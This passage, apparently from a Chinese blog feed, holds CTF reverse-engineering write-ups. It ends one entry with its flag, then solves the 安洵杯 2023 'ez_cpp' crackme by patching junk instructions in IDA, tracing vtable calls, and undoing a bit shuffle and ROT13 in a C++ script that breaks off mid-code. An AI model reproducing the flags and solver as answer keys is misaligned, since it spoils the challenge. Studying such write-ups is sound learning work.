class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>SYC{1_w4Nn4_buy_4_c4R_G1V3_M3_50w_$}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%2014.png" alt="安洵杯2023-ez_ezr3 14.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【安洵杯 2023】ez_cpp</title>
      <link href="/posts/2157de72.html"/>
      <url>/posts/2157de72.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>花指令的去除</p></li><li><p><mark>将一个变量指向一段代码的地址，然后使用这个变量来作为函数执行</mark></p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">_DWORD <span class="token operator">*</span>__thiscall <span class="token function">sub_41352E</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token comment">// sub_41352E(v20)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>calt<span class="token double-colon punctuation">::</span>`vftable<span class="token char">';  // this 指向 calt::`vftable'</span>result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1388249934</span><span class="token punctuation">;</span><span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">;</span> <span class="token keyword">const</span> calt<span class="token double-colon punctuation">::</span>`vftable<span class="token number">'</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC84 <span class="token number">38</span> <span class="token number">14</span> <span class="token number">41</span> <span class="token number">00</span>                   <span class="token operator">?</span><span class="token operator">?</span>_7calt@@<span class="token number">6</span>B@ dd offset sub_411438<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC88 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC89 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC8A <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC8B <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>AC8C F0 B3 <span class="token number">41</span> <span class="token number">00</span>                   dd offset <span class="token operator">?</span><span class="token operator">?</span>_R4trans@@<span class="token number">6</span>B@<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_413AE0</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__thiscall <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>  <span class="token comment">// sub_413AE0(v20, &amp;v18)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将 v20 作为函数执行</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>IDA 中数据的表示</mark></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADC0 <span class="token number">22</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> A2 FF FF FF <span class="token number">72</span> <span class="token number">00</span><span class="token operator">+</span>xmmword_41ADC0 xmmword <span class="token number">0FFFF</span>FFE600000072FFFFFFA200000022h<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADC0 <span class="token number">00</span> <span class="token number">00</span> E6 FF FF FF                                                     <span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADD0 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADD1 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADD2 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">0041</span>ADD3 <span class="token number">00</span>                            db    <span class="token number">0</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41ADC0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFA2</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><a href="http://ctf.i-soon.net:8080/account/login?from=/games">（2023年6月10日）【安洵杯 2023】ez_cpp</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>用 IDA 打开，定位到主函数，发现花指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp1.png" alt="安洵杯2023-ez_cpp1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp2.png" alt="安洵杯2023-ez_cpp2.png"></p><p>首先 Patch 掉花指令<br>在 jmp 红色地址的语句处按 <code>快捷键 D</code> 将硬指令第一字节 <code>E8</code> 改为 <code>90</code><br>然后使用 <code>快捷键 C</code> 转为代码<br>最后在 main 起始地址处按 <code>快捷键 P</code> 重新生成 <code>main_0()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp4.png" alt="安洵杯2023-ez_cpp4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp3.png" alt="安洵杯2023-ez_cpp3.png"></p><p>在 <code>sub_411177()</code> 中也存在花指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp5.png" alt="安洵杯2023-ez_cpp5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp6.png" alt="安洵杯2023-ez_cpp6.png"></p><p>Patch 掉花指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp7.png" alt="安洵杯2023-ez_cpp7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp8.png" alt="安洵杯2023-ez_cpp8.png"></p><p>提取 <code>v14[]</code> 的值，定位到几个 <code>xmmword</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp9.png" alt="安洵杯2023-ez_cpp9.png"></p><p>使用 IDA 提取数据可得：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41ADC0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFA2</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41ADA0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000052</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF8C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFF2</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41AD00<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x0000003C</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41AD20<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF9C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF86</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41AD80<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">,</span> <span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFB6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41AD60<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFCE</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFAC</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41AD40<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x0000006A</span><span class="token punctuation">,</span> <span class="token number">0x0000002C</span><span class="token punctuation">,</span> <span class="token number">0x0000007C</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> xmmword_41ACE0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到 <code>v14[32]</code> 的值：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v14 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFA2</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE6</span><span class="token punctuation">,</span>         <span class="token number">0x00000052</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF8C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFF2</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">,</span>         <span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x0000003C</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span>         <span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF9C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF86</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span>         <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">,</span> <span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFB6</span><span class="token punctuation">,</span>         <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFCE</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFAC</span><span class="token punctuation">,</span>         <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x0000006A</span><span class="token punctuation">,</span> <span class="token number">0x0000002C</span><span class="token punctuation">,</span> <span class="token number">0x0000007C</span><span class="token punctuation">,</span>         <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据最后的校验逻辑，最后经过处理的 <code>v21</code> 的值就是 <code>v14</code></p><p>已知：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>v5 <span class="token operator">=</span> v15<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token function">sub_411177</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> v15<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> v17 <span class="token operator">*</span> v16 <span class="token operator">*</span> v15<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">*</span> v16<span class="token punctuation">)</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> v5<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>v21<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7 <span class="token operator">^</span> <span class="token function">sub_411177</span><span class="token punctuation">(</span>v21<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以先将上一步的 <code>v21</code> 求出来：<br>即，先通过 <code>v7 ^ (v14[v6] &amp; 0xFF)</code> 得出 <code>sub_411177(v21[v6], v8)</code> 的结果<br><em>（注意 v7 为 char 类型，占一字节，所以 <code>v14[v6] &amp; 0xFF</code> 取低位的一字节进行异或）</em><br>然后暴力破解 <code>sub_411177(v21[v6], v8)</code> 中的 <code>v21[v6]</code></p><p>前面还将输入 <code>v21</code> 赋值给 <code>v18</code>，进行了 <code>sub_411136(v19, &amp;v18)</code> 和 <code>sub_411136(v20, &amp;v18)</code> 处理</p><p>跟进 <code>sub_411136()</code>，会执行 <code>sub_413AE0(a1, a2)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp10.png" alt="安洵杯2023-ez_cpp10.png"></p><p>根据 <code>return (**a1)(a1, a2)</code>，这里是将 <code>a1</code> 也就是 <code>v19</code> 和 <code>v20</code> 作为函数执行，<code>a2</code> 也就是 <code>v18</code> 作为参数<br>也就是 <code>v19</code> 和 <code>v20</code> 其实指向的是两个函数</p><p>跟进 <code>sub_4113D4(v20)</code>，会执行 <code>sub_4133A4(this)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp11.png" alt="安洵杯2023-ez_cpp11.png"></p><p>*this &#x3D; &amp;calt::`vftable&#39; 将 <code>v20</code> 指向一个函数的地址，跟进 calt::`vftable&#39;：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp12.png" alt="安洵杯2023-ez_cpp12.png"></p><p>跟进 <code>sub_411438()</code>，会跳转到 <code>sub_4138AF()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp13.png" alt="安洵杯2023-ez_cpp13.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp14.png" alt="安洵杯2023-ez_cpp14.png"></p><p>在 <code>sub_411140(this[1], v6)</code> 中发现花指令，Patch 掉：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp15.png" alt="安洵杯2023-ez_cpp15.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp16.png" alt="安洵杯2023-ez_cpp16.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp17.png" alt="安洵杯2023-ez_cpp17.png"></p><p>这个函数的功能是将整数 <code>a1</code> 的二进制表示从高位到低位的每一位值（0 或 1）存储到整型数组 <code>a2</code> 中，并按顺序逐个存储（共 32 位）<br>即 <code>sub_411140(this[1], v6)</code> 将 <code>this[1] = 1388249934</code> 转换为 32 位二进制数据存储在数组 <code>v6[]</code> 中</p><p>得到 <code>v6[32] = &#123;0,1,0,1,0,0,1,0,1,0,1,1,1,1,1,1,0,0,0,0,0,0,1,1,0,1,0,0,1,1,1,0&#125;</code><br>处理过程把逻辑反一下就行</p><p>同理，跟进 <code>sub_4112DA(v19)</code>，会执行 <code>sub_41352E(this)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp18.png" alt="安洵杯2023-ez_cpp18.png"></p><p>*this &#x3D; &amp;trans::`vftable&#39; 将 <code>v20</code> 指向一个函数的地址，跟进 trans::`vftable&#39;</p><p><code>sub_41132A()</code> 会跳转到 <code>sub_413972()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp19.png" alt="安洵杯2023-ez_cpp19.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp21.png" alt="安洵杯2023-ez_cpp21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp20.png" alt="安洵杯2023-ez_cpp20.png"></p><p>其中 <code>this[1] = &#39;Z&#39;</code>，<code>this[2] = &#39;z&#39;</code>，实现的是移位为 13 的凯撒密码，分别处理 <code>a - z</code> 和 <code>A - Z</code><br>按照逻辑移位 13 还原即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">sub_411177</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// edx</span>    <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// edi</span>    <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// ebx</span>    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v4 <span class="token operator">=</span> a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>            v2 <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">>></span> v3<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> v4<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> a2 <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">v20</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// v6[32] 为 1388249934 对应的二进制数：1010010101111110000001101001110</span>    <span class="token keyword">int</span> v6<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>v4 <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v4 <span class="token operator">>=</span> <span class="token number">16</span><span class="token punctuation">)</span>                key<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span 